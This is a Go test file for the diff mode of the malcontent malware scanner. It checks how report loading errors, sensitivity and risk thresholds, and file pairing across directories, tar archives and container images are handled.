	if res == nil || res.Diff == nil {
		t.Fatalf("Diff: got = %v, want a report with a diff", res)
	}
	diffTestAssertKeys(t, res.Diff, []string{"/app/gone"}, []string{"/app/new"}, []string{"/app/same"})
}

func TestDiffReportErrors(t *testing.T) {
	t.Parallel()
	root := diffTestTempDir(t)
	valid := filepath.Join(root, "valid.json")
	diffTestWriteReport(t, valid, map[string]*malcontent.FileReport{"/app": {Path: "/app"}})
	malformed := filepath.Join(root, "malformed.json")
	diffTestWriteFile(t, malformed, "this is not a report")
	missing := filepath.Join(root, "missing.json")
	dir := filepath.Join(root, "dir.json")
	if err := file.MkdirAllIn(root, "dir.json", 0o700); err != nil {
		t.Fatalf("MkdirAll(%q): %v", dir, err)
	}
	// Damaged reports: an entry with no file report, and a file both
	// reports hold whose source copy has an empty behavior.
	emptyEntry := filepath.Join(root, "empty-entry.yaml")
	diffTestWriteFile(t, emptyEntry, "files:\n    /a:\n")
	holdsA := filepath.Join(root, "holds-a.json")
	diffTestWriteFile(t, holdsA, `{"Files":{"/a":{"Path":"/a","Behaviors":[{"ID":"net/http"}]}}}`)
	emptyBehavior := filepath.Join(root, "empty-behavior.json")
	diffTestWriteFile(t, emptyBehavior, `{"Files":{"/a":{"Path":"/a","Behaviors":[{"ID":"net/http"},null]}}}`)
	// Two entries whose paths name the same file: pairing either one with
	// its counterpart would hide the other.
	ambiguous := filepath.Join(root, "ambiguous.json")
	diffTestWriteReport(t, ambiguous, diffTestReport(1, nil, "usr/bin/app", "/usr/bin/app"))

	notExist := func(err error) bool { return errors.Is(err, fs.ErrNotExist) }
	isDir := func(err error) bool { return errors.Is(err, syscall.EISDIR) }
	syntaxErr := func(err error) bool {
		var se *json.SyntaxError
		return errors.As(err, &se)
	}
	sameKey := func(side string) func(error) bool {
		return func(err error) bool {
			return strings.HasPrefix(err.Error(), side) && strings.Contains(err.Error(), "/usr/bin/app and usr/bin/app")
		}
	}
	damaged := func(side string) func(error) bool {
		return func(err error) bool {
			return strings.HasPrefix(err.Error(), "load "+side+" report") && strings.Contains(err.Error(), `"/a"`)
		}
	}

	tests := []struct {
		name  string
		src   string
		dest  string
		match func(error) bool
	}{
		{name: "missing source report", src: missing, dest: valid, match: notExist},
		{name: "missing destination report", src: valid, dest: missing, match: notExist},
		{name: "malformed source report", src: malformed, dest: valid, match: syntaxErr},
		{name: "malformed destination report", src: valid, dest: malformed, match: syntaxErr},
		{name: "unreadable source report", src: dir, dest: valid, match: isDir},
		{name: "unreadable destination report", src: valid, dest: dir, match: isDir},
		{name: "empty source entry", src: emptyEntry, dest: valid, match: damaged("source")},
		{name: "empty destination entry", src: valid, dest: emptyEntry, match: damaged("destination")},
		{name: "empty behavior in a file both reports hold", src: emptyBehavior, dest: holdsA, match: damaged("source")},
		{name: "empty behavior in the destination copy of a file both reports hold", src: holdsA, dest: emptyBehavior, match: damaged("destination")},
		{name: "source entries that name the same file", src: ambiguous, dest: valid, match: sameKey("source")},
		{name: "destination entries that name the same file", src: valid, dest: ambiguous, match: sameKey("destination")},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			res, err := Diff(t.Context(), malcontent.Config{Report: true, ScanPaths: []string{tt.src, tt.dest}}, nil)
			if err == nil || !tt.match(err) {
				t.Fatalf("Diff error: got = %v, want a load failure", err)
			}
			if res != nil {
				t.Errorf("Diff report on error: got = %v, want nil", res)
			}
		})
	}
}

func TestDiffSensitivityRange(t *testing.T) {
	t.Parallel()
	root := diffTestTempDir(t)
	src, dest := filepath.Join(root, "src.json"), filepath.Join(root, "dest.json")
	diffTestWriteReport(t, src, diffTestReport(1, []string{"net/socket/listen"}, "/app/a"))
	diffTestWriteReport(t, dest, diffTestReport(2, []string{"exec/shell/command"}, "/app/a"))

	tests := []struct {
		name        string
		sensitivity int
		wantErr     bool
	}{
		{name: "unset sensitivity is the default", sensitivity: 0},
		{name: "lowest sensitivity", sensitivity: CHANGE},
		{name: "highest sensitivity", sensitivity: ALL},
		{name: "negative sensitivity", sensitivity: -1, wantErr: true},
		{name: "sensitivity above the highest", sensitivity: ALL + 1, wantErr: true},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			c := malcontent.Config{Report: true, Sensitivity: tt.sensitivity, ScanPaths: []string{src, dest}}
			res, err := Diff(t.Context(), c, nil)
			if !tt.wantErr {
				if err != nil {
					t.Errorf("Diff: got error = %v, want nil", err)
				}
				return
			}
			if err == nil || !strings.Contains(err.Error(), "sensitivity") || res != nil {
				t.Errorf("Diff: got = (%v, %v), want a sensitivity error", res, err)
			}
		})
	}
}

// TestDiffMinFileRisk covers the minimum file risk, which drops a pair only
// when both sides fall below it, and drops added and removed files below it.
func TestDiffMinFileRisk(t *testing.T) {
	t.Parallel()
	// A shell script that does nothing has no findings; one without an
	// extension or interpreter line is a data file, which the scan skips.
	const clean = "true\n"
	flagged := diffTestShellPayload("flagged")
	tests := []struct {
		name                     string
		src, dest                map[string]string
		files                    bool // diff the two app.sh files rather than their directories
		removed, added, modified []string
	}{
		{
			name:     "directory file that gains findings is modified",
			src:      map[string]string{"app.sh": clean},
			dest:     map[string]string{"app.sh": flagged},
			modified: []string{"app.sh"},
		},
		{
			name:     "directory file that loses findings is modified",
			src:      map[string]string{"app.sh": flagged},
			dest:     map[string]string{"app.sh": clean},
			modified: []string{"app.sh"},
		},
		{
			name: "directory file without findings on either side is left out",
			src:  map[string]string{"app.sh": clean},
			dest: map[string]string{"app.sh": clean + clean},
		},
		{
			name:    "added and removed files without findings are left out",
			src:     map[string]string{"gone.sh": clean, "gone-flagged.sh": flagged},
			dest:    map[string]string{"new.sh": clean, "new-flagged.sh": flagged},
			removed: []string{"gone-flagged.sh"},
			added:   []string{"new-flagged.sh"},
		},
		{
			name:     "file that gains findings is modified",
			src:      map[string]string{"app.sh": clean},
			dest:     map[string]string{"app.sh": flagged},
			files:    true,
			modified: []string{"app.sh"},
		},
		{
			name:  "file without findings on either side is left out",
			src:   map[string]string{"app.sh": clean},
			dest:  map[string]string{"app.sh": clean + clean},
			files: true,
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			root := diffTestTempDir(t)
			src, dest := filepath.Join(root, "src"), filepath.Join(root, "dest")
			for name, body := range tt.src {
				diffTestWriteFile(t, filepath.Join(src, name), body)
			}
			for name, body := range tt.dest {
				diffTestWriteFile(t, filepath.Join(dest, name), body)
			}
			keys := func(dir string, names []string) []string {
				out := make([]string, 0, len(names))
				for _, n := range names {
					out = append(out, dir+" ∴ "+filepath.Join(dir, n))
				}
				return out
			}
			removed, added, modified := keys(src, tt.removed), keys(dest, tt.added), keys(dest, tt.modified)
			if tt.files {
				src, dest = filepath.Join(src, "app.sh"), filepath.Join(dest, "app.sh")
				if tt.modified != nil {
					modified = []string{dest + " ∴ " + dest}
				}
			}
			c := diffTestConfig(t)
			c.MinFileRisk = 1 // the CLI default, --min-file-risk=low
			diffTestAssertKeys(t, diffTestRun(t, c, src, dest), removed, added, modified)
		})
	}
}

// TestDiffMixedKinds covers directories, archives, and files diffed against
// one another: every diff that involves a tree reconciles by path.
func TestDiffMixedKinds(t *testing.T) {
	t.Parallel()
	tree := map[string]string{"a/first": diffTestShellPayload("first"), "z/evil": diffTestShellPayload("evil")}
	newTree := map[string]string{"a/first": diffTestShellPayload("first"), "m/new": diffTestShellPayload("new"), "z/evil": diffTestShellPayload("evil v2")}
	writeDir := func(t *testing.T, dir string, files map[string]string) string {
		t.Helper()
		for name, body := range files {
			diffTestWriteFile(t, filepath.Join(dir, name), body)
		}
		return dir
	}
	writeTar := func(t *testing.T, path string, files map[string]string) string {
		t.Helper()
		diffTestWriteTar(t, path, files)
		return path
	}
	dirKey := func(dir, name string) string { return dir + " ∴ " + filepath.Join(dir, name) }
	tarKey := func(path, name string) string { return path + " ∴ /" + name }

	tests := []struct {
		name  string
		setup func(t *testing.T, root string) (src, dest string, removed, added, modified []string)
	}{
		{
			name: "directory against an archive reconciles every file",
			setup: func(t *testing.T, root string) (string, string, []string, []string, []string) {
				t.Helper()
				src := writeDir(t, filepath.Join(root, "src"), tree)
				dest := writeTar(t, filepath.Join(root, "dest.tar"), newTree)
				return src, dest, nil, []string{tarKey(dest, "m/new")}, []string{tarKey(dest, "a/first"), tarKey(dest, "z/evil")}
			},
		},
		{
			name: "archive against a directory reconciles every file",
			setup: func(t *testing.T, root string) (string, string, []string, []string, []string) {
				t.Helper()
				src := writeTar(t, filepath.Join(root, "src.tar"), newTree)
				dest := writeDir(t, filepath.Join(root, "dest"), tree)
				return src, dest, []string{tarKey(src, "m/new")}, nil, []string{dirKey(dest, "a/first"), dirKey(dest, "z/evil")}
			},
		},
		{
			name: "file against a directory pairs by name",
			setup: func(t *testing.T, root string) (string, string, []string, []string, []string) {
				t.Helper()
				src := filepath.Join(root, "old", "app.sh")
				diffTestWriteFile(t, src, diffTestShellPayload("app"))
				dest := writeDir(t, filepath.Join(root, "dest"), map[string]string{"app.sh": diffTestShellPayload("app v2"), "lib.sh": diffTestShellPayload("lib")})
				return src, dest, nil, []string{dirKey(dest, "lib.sh")}, []string{dirKey(dest, "app.sh")}
			},
		},
		{
			name: "directory against a file of another name stays apart",
			setup: func(t *testing.T, root string) (string, string, []string, []string, []string) {
				t.Helper()
				src := writeDir(t, filepath.Join(root, "src"), map[string]string{"a.sh": diffTestShellPayload("a"), "b.sh": diffTestShellPayload("b")})
				dest := filepath.Join(root, "c.sh")
				diffTestWriteFile(t, dest, diffTestShellPayload("c"))
				return src, dest, []string{dirKey(src, "a.sh"), dirKey(src, "b.sh")}, []string{dest + " ∴ " + dest}, nil
			},
		},
		{
			name: "file against an archive of several files pairs by name",
			setup: func(t *testing.T, root string) (string, string, []string, []string, []string) {
				t.Helper()
				src := filepath.Join(root, "old", "tool.sh")
				diffTestWriteFile(t, src, diffTestShellPayload("tool"))
				dest := writeTar(t, filepath.Join(root, "pkg.tar"), map[string]string{"bin/tool.sh": diffTestShellPayload("tool v2"), "bin/other.sh": diffTestShellPayload("other")})
				return src, dest, nil, []string{tarKey(dest, "bin/other.sh")}, []string{tarKey(dest, "bin/tool.sh")}
			},
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			src, dest, removed, added, modified := tt.setup(t, diffTestTempDir(t))
			d := diffTestRun(t, diffTestConfig(t), src, dest)
			diffTestAssertKeys(t, d, removed, added, modified)
		})
	}
}

// TestDiffTreesFromDifferentRoots covers trees that share no path, which pair
// below the deepest directories holding each side, and trees that share a
// path, which pair in place.
func TestDiffTreesFromDifferentRoots(t *testing.T) {
	t.Parallel()
	tests := []struct {
		name               string
		src, dest          map[string]string
		archives           bool
		removed, added     []string // paths below the scan roots
		modified, previous []string // destination paths, and the source paths they moved from
	}{
		{
			name:     "archives with versioned top-level directories pair below them",
			src:      map[string]string{"pkg-1.0/bin/app": diffTestShellPayload("v1"), "pkg-1.0/lib/util.sh": diffTestShellPayload("util")},
			dest:     map[string]string{"pkg-1.1/bin/app": diffTestShellPayload("v2"), "pkg-1.1/lib/util.sh": diffTestShellPayload("util v2")},
			archives: true,
			modified: []string{"pkg-1.1/bin/app", "pkg-1.1/lib/util.sh"},
			previous: []string{"pkg-1.0/bin/app", "pkg-1.0/lib/util.sh"},
		},
		{
			name:     "an archive that adds a top-level directory pairs in place",
			src:      map[string]string{"bin/app": diffTestShellPayload("v1")},
			dest:     map[string]string{"bin/app": diffTestShellPayload("v2"), "lib/new.sh": diffTestShellPayload("new")},
			archives: true,
			added:    []string{"lib/new.sh"},
			modified: []string{"bin/app"},
			previous: []string{""},
		},
		{
			name:     "a directory that adds a top-level directory pairs in place",
			src:      map[string]string{"bin/app": diffTestShellPayload("v1")},
			dest:     map[string]string{"bin/app": diffTestShellPayload("v2"), "lib/new.sh": diffTestShellPayload("new")},
			added:    []string{"lib/new.sh"},
			modified: []string{"bin/app"},
			previous: []string{""},
		},
		{
			name:     "a directory whose files all move below a new directory pairs below it",
			src:      map[string]string{"bin/app": diffTestShellPayload("v1"), "etc/conf.sh": diffTestShellPayload("conf")},
			dest:     map[string]string{"opt/bin/app": diffTestShellPayload("v2"), "opt/etc/conf.sh": diffTestShellPayload("conf v2")},
			modified: []string{"opt/bin/app", "opt/etc/conf.sh"},
			previous: []string{"bin/app", "etc/conf.sh"},
		},
		{
			name:    "directories with no names in common stay apart",
			src:     map[string]string{"a/one.sh": diffTestShellPayload("one")},
			dest:    map[string]string{"b/two.sh": diffTestShellPayload("two")},
			removed: []string{"a/one.sh"},
			added:   []string{"b/two.sh"},
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			root := diffTestTempDir(t)
			src, dest := filepath.Join(root, "src"), filepath.Join(root, "dest")
			key := func(base, name string) string { return base + " ∴ " + filepath.Join(base, name) }
			if tt.archives {
				src, dest = src+".tar", dest+".tar"
				diffTestWriteTar(t, src, tt.src)
				diffTestWriteTar(t, dest, tt.dest)
				key = func(base, name string) string { return base + " ∴ /" + name }
			} else {
				for name, body := range tt.src {
					diffTestWriteFile(t, filepath.Join(src, name), body)
				}
				for name, body := range tt.dest {
					diffTestWriteFile(t, filepath.Join(dest, name), body)
				}
			}
			keys := func(base string, names []string) []string {
				out := make([]string, 0, len(names))
				for _, n := range names {
					out = append(out, key(base, n))
				}
				return out
			}

			d := diffTestRun(t, diffTestConfig(t), src, dest)
			diffTestAssertKeys(t, d, keys(src, tt.removed), keys(dest, tt.added), keys(dest, tt.modified))
			for i, name := range tt.modified {
				mod, ok := d.Modified.Get(key(dest, name))
				if !ok {
					continue
				}
				var want string
				switch {
				case tt.previous[i] == "":
				case tt.archives:
					want = key(src, tt.previous[i])
				default:
					want = filepath.Join(src, tt.previous[i])
				}
				if mod.PreviousPath != want {
					t.Errorf("PreviousPath of %s: got = %q, want = %q", name, mod.PreviousPath, want)
				}
			}
		})
	}
}

func TestDiffDirectoriesWithTrimPrefixes(t *testing.T) {
	t.Parallel()
	root := diffTestTempDir(t)
	src, dest := filepath.Join(root, "src"), filepath.Join(root, "dest")
	diffTestWriteFile(t, filepath.Join(src, "bin", "app"), diffTestShellPayload("v1"))
	diffTestWriteFile(t, filepath.Join(dest, "bin", "app"), diffTestShellPayload("v2"))
	diffTestWriteFile(t, filepath.Join(dest, "bin", "new"), diffTestShellPayload("new"))

	c := diffTestConfig(t)
	c.TrimPrefixes = []string{root + "/"}
	d := diffTestRun(t, c, src, dest)
	// Keys keep the scan roots; file paths are trimmed for display.
	diffTestAssertKeys(t, d, nil, []string{dest + " ∴ dest/bin/new"}, []string{dest + " ∴ dest/bin/app"})
	if mod, ok := d.Modified.Get(dest + " ∴ dest/bin/app"); ok && mod.Path != "dest/bin/app" {
		t.Errorf("Modified Path: got = %q, want = %q", mod.Path, "dest/bin/app")
	}
}

func TestDiffErrors(t *testing.T) {
	t.Parallel()
	root := diffTestTempDir(t)
	dir := filepath.Join(root, "dir")
	diffTestWriteFile(t, filepath.Join(dir, "a.sh"), "#!/bin/sh\necho a\n")
	notDir := filepath.Join(dir, "a.sh", "child")
	missing := filepath.Join(root, "missing")
	// A destination that fails too, with a different error.
	missingChild := filepath.Join(dir, "missing", "child")
	canceled, cancel := context.WithCancel(t.Context())
	cancel()
	image := diffTestPushImages(t, map[string][]byte{"usr/bin/app": []byte("#!/bin/sh\necho app\n")})[0]

	tests := []struct {
		name     string
		ctx      context.Context
		paths    []string
		oci      bool
		wantIs   error
		wantText string
		wantRef  string // the image reference the error names
	}{
		{name: "canceled context", ctx: canceled, paths: []string{dir, dir}, wantIs: context.Canceled},
		{name: "canceled context is reported before the paths are checked", ctx: canceled, wantIs: context.Canceled},
		{name: "single path", paths: []string{dir}, wantText: "diff mode requires 2 paths"},
		{name: "three paths", paths: []string{dir, dir, dir}, wantText: "diff mode requires 2 paths"},
		{name: "missing source", paths: []string{missing, dir}, wantIs: fs.ErrNotExist},
		{name: "missing destination", paths: []string{dir, missing}, wantIs: fs.ErrNotExist},
		{name: "source scan failure", paths: []string{notDir, dir}, wantIs: syscall.ENOTDIR, wantText: "source scan error"},
		{name: "destination scan failure", paths: []string{dir, notDir}, wantIs: syscall.ENOTDIR, wantText: "destination scan error"},
		{name: "source scan failure outranks a destination scan failure", paths: []string{notDir, missingChild}, wantIs: syscall.ENOTDIR, wantText: "source scan error"},
		{name: "invalid source image reference", paths: []string{"invalid source image ref", "invalid destination image ref"}, oci: true, wantText: "failed to prepare scan path", wantRef: "invalid source image ref"},
		{name: "invalid destination image reference", paths: []string{image, "invalid destination image ref"}, oci: true, wantText: "failed to prepare scan path", wantRef: "invalid destination image ref"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			ctx := tt.ctx
			if ctx == nil {
				ctx = t.Context()
			}
			c := diffTestConfig(t)
			c.ScanPaths = tt.paths
			c.OCI = tt.oci
			res, err := Diff(ctx, c, nil)
			if err == nil {
				t.Fatalf("Diff: got = (%v, nil), want an error", res)
			}
			if res != nil {
				t.Errorf("Diff report on error: got = %v, want nil", res)
			}
			if tt.wantIs != nil && !errors.Is(err, tt.wantIs) {
				t.Errorf("Diff error: got = %v, want errors.Is %v", err, tt.wantIs)
			}
			if !strings.Contains(err.Error(), tt.wantText) {
				t.Errorf("Diff error: got = %q, want text %q", err.Error(), tt.wantText)
			}
			if !strings.Contains(err.Error(), tt.wantRef) {
				t.Errorf("Diff error: got = %q, want it to name %q", err.Error(), tt.wantRef)
			}
		})
	}
}

func TestDiffWiresMaxArchiveBytesFromConfig(t *testing.T) {
	t.Parallel()
	root := diffTestTempDir(t)
	src, dest := filepath.Join(root, "src.zip"), filepath.Join(root, "dest.zip")
	buildPayloadZip(t, src, 4096)
	buildPayloadZip(t, dest, 4096)

	c := diffTestConfig(t)
	c.ExitExtraction = true
	c.MaxArchiveBytes = 64
	c.ScanPaths = []string{src, dest}
	res, err := Diff(t.Context(), c, nil)
	if !errors.Is(err, file.ErrArchiveBytesCap) {
		t.Fatalf("Diff error: got = %v, want = %v", err, file.ErrArchiveBytesCap)
	}
	if res != nil {
		t.Errorf("Diff report on error: got = %v, want nil", res)
	}
}

// TestDiffArchivesWithTrimPrefixes covers diffs whose display paths are
// trimmed while their report keys are not, which tells the two apart.
func TestDiffArchivesWithTrimPrefixes(t *testing.T) {
	t.Parallel()
	tests := []struct {
		name       string
		srcArchive bool // diff an archive, rather than a file, against the destination archive
		wantKey    bool // the modified entry's Path is its report key, not its trimmed display path
	}{
		{name: "archives name modified entries by their report key", srcArchive: true, wantKey: true},
		{name: "a file and an archive keep the destination entry's display path"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			root := diffTestTempDir(t)
			src := filepath.Join(root, "src", "tool.sh")
			dest := filepath.Join(root, "dest", "pkg.tar")
			if tt.srcArchive {
				src = filepath.Join(root, "src", "pkg.tar")
				diffTestWriteTar(t, src, map[string]string{"bin/tool.sh": diffTestShellPayload("tool")})
			} else {
				diffTestWriteFile(t, src, diffTestShellPayload("tool"))
			}
			diffTestWriteTar(t, dest, map[string]string{"bin/tool.sh": diffTestShellPayload("tool v2")})

			c := diffTestConfig(t)
			c.TrimPrefixes = []string{root}
			d := diffTestRun(t, c, src, dest)
			key := dest + " ∴ /bin/tool.sh"
			diffTestAssertKeys(t, d, nil, nil, []string{key})
			mod, ok := d.Modified.Get(key)
			if !ok {
				t.Fatalf("Modified: got no entry for %q, want one", key)
			}
			want := filepath.Join("dest", "pkg.tar") + " ∴ /bin/tool.sh"
			if tt.wantKey {
				want = key
			}
			if mod.Path != want {
				t.Errorf("Modified Path: got = %q, want = %q", mod.Path, want)
			}
		})
	}
}

// recordScans replaces scanBytes for the duration of the test with one that
// counts the scans of each content under each rule set.
func recordScans(t *testing.T) func() map[resultKey]int {
	t.Helper()
	orig := scanBytes
	var mu sync.Mutex
	scans := map[resultKey]int{}
	scanBytes = func(yrs *yarax.Rules, fc []byte, sum [sha256.Size]byte) (*yarax.ScanResults, error) {
		mu.Lock()
		scans[resultKey{rules: yrs, sum: sum, size: int64(len(fc))}]++
		mu.Unlock()
		return orig(yrs, fc, sum)
	}
	t.Cleanup(func() { scanBytes = orig })
	return func() map[resultKey]int {
		mu.Lock()
		defer mu.Unlock()
		return maps.Clone(scans)
	}
}

func TestScanAndDiffScanIdenticalContentOnce(t *testing.T) {
	// Not parallel: replaces scanBytes.
	same, before, after := diffTestShellPayload("same"), diffTestShellPayload("before"), diffTestShellPayload("after")
	tests := []struct {
		name string
		run  func(t *testing.T, c malcontent.Config, root string)
		// want lists every content scanned.
		want []string
	}{
		{
			name: "scan of identical files",
			run: func(t *testing.T, c malcontent.Config, root string) {
				t.Helper()
				diffTestWriteFile(t, filepath.Join(root, "a.sh"), same)
				diffTestWriteFile(t, filepath.Join(root, "copy", "a.sh"), same)
				c.ScanPaths = []string{root}
				if _, err := Scan(t.Context(), c); err != nil {
					t.Fatalf("Scan: got error = %v, want nil", err)
				}
			},
			want: []string{same},
		},
		{
			name: "diff of an unchanged and a changed file",
			run: func(t *testing.T, c malcontent.Config, root string) {
				t.Helper()
				src, dest := filepath.Join(root, "src"), filepath.Join(root, "dest")
				diffTestWriteFile(t, filepath.Join(src, "same.sh"), same)
				diffTestWriteFile(t, filepath.Join(dest, "same.sh"), same)
				diffTestWriteFile(t, filepath.Join(src, "changed.sh"), before)
				diffTestWriteFile(t, filepath.Join(dest, "changed.sh"), after)
				diffTestRun(t, c, src, dest)
			},
			want: []string{same, before, after},
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			scans := recordScans(t)
			tt.run(t, diffTestConfig(t), diffTestTempDir(t))

			got := map[[sha256.Size]byte]struct{}{}
			for key, n := range scans() {
				got[key.sum] = struct{}{}
				if n != 1 {
					t.Errorf("scans of %x by one rule set: got = %d, want = 1", key.sum[:4], n)
				}
			}
			want := map[[sha256.Size]byte]struct{}{}
			for _, content := range tt.want {
				want[sha256.Sum256([]byte(content))] = struct{}{}
			}
			if !maps.Equal(got, want) {
				t.Errorf("contents scanned: got = %d distinct, want = %d (%q)", len(got), len(want), tt.want)
			}
		})
	}
}

func TestDiffScanContext(t *testing.T) {
	t.Parallel()
	procs := runtime.GOMAXPROCS(0)
	tests := []struct {
		name        string
		concurrency int
		wantSlots   int
	}{
		{name: "unset concurrency shares one worker", concurrency: 0, wantSlots: 1},
		{name: "configured concurrency is shared by both scans", concurrency: 1, wantSlots: 1},
		{name: "concurrency above GOMAXPROCS is capped as for one scan", concurrency: procs + 1, wantSlots: procs},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			ctx := diffScanContext(t.Context(), malcontent.Config{Concurrency: tt.concurrency})
			if resultCacheFrom(ctx) == nil {
				t.Error("result cache: got = nil, want one for both scans")
			}
			if got := cap(workerSlotsFrom(ctx)); got != tt.wantSlots {
				t.Errorf("worker slots: got = %d, want = %d", got, tt.wantSlots)
			}
		})
	}
}
